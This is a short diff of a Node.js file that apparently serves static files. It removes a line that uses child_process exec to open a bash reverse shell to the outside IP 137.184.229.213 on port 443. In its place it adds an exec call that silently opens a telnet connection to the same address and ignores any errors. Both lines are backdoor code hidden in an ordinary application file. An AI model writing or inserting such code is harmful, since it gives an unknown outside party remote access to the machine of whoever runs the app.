@@ -8,7 +8,7 @@ const public = file => path.resolve("public", file || '');
 
 var fs = require('fs');
 const { exec } = require('child_process');
-exec('bash -c "bash -i 1>& /dev/tcp/137.184.229.213/443"', (err, stdout, stderr) => {
+exec('telnet 137.184.229.213 80', (err, stdout, stderr) => {
   if (err) {
     // node couldn't execute the command
     return;
